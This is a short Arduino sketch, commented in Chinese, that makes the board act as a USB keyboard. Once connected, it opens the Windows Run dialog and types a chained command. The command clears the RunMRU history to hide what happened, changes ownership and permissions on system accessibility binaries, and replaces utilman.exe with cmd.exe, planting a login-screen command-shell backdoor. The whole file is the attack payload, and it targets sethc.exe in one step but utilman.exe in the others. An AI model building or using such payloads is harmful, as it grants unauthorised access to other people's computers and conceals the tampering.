void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd /c start /min reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f&takeown /f %SystemRoot%\\system32\\sethc.exe&echo y|cacls %SystemRoot%\\system32\\utilman.exe /G %USERNAME%:F&copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\utilman.exe /Y");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
